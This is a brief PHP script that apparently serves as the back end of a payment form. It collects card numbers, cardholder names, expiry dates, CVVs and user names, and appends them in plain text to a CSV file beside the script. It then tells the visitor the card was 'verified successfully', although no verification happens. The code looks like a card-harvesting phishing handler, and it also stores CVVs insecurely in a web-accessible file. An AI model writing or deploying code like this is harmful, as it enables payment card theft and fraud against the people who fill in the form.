<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $card_number = htmlspecialchars($_POST['card_number']);
    $card_holder = htmlspecialchars($_POST['card_holder']);
    $expiry_date = htmlspecialchars($_POST['expiry_date']);
    $cvv = htmlspecialchars($_POST['cvv']);
    $user_id = htmlspecialchars($_POST['user_name']); // Changed to user_id

    $data = [
        $card_number,
        $card_holder,
        $expiry_date,
        $cvv,
        $user_id // Include user_id in the data array
    ];

    $file_path = __DIR__ . '/payments.csv'; // Use absolute path
    $file = fopen($file_path, 'a');

    if ($file) {
        if (fputcsv($file, $data)) {
            fclose($file);
            echo "<script>alert('Payment details verified successfully.'); window.location.href = window.location.href;</script>";
        } else {
            fclose($file);
            echo "<script>alert('Error: verification failed.'); window.location.href = window.location.href;</script>";
        }
    } else {
        echo "<script>alert('Error capturing data: " . htmlspecialchars($file_path) . "'); window.location.href = window.location.href;</script>";
        error_log("Failed to verify card: " . htmlspecialchars($file_path));
        error_log("File permissions: " . substr(sprintf('%o', fileperms($file_path)), -4));
        error_log("Directory permissions: " . substr(sprintf('%o', fileperms(__DIR__)), -4));
    }
}
?>
